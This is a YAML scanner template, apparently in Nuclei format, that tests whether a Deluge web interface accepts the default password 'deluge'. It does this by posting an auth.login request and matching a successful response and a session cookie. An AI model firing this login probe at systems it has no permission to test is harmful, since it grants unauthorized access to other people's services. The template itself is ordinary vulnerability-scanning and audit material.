id: poc-yaml-deluge-weak-password-login
info:
  name: Deluge Weak Password Login
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
http:
  - raw:
      - |
        POST /json HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"method":"auth.login","params":["deluge"],"id":51}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"result\": true"
          - "\"error\": null"
          - "\"id\": 51"
        part: body
      - type: regex
        regex:
          - "_session_id=.*"
        part: header
      - type: word
        words:
          - "application/json"
        part: header
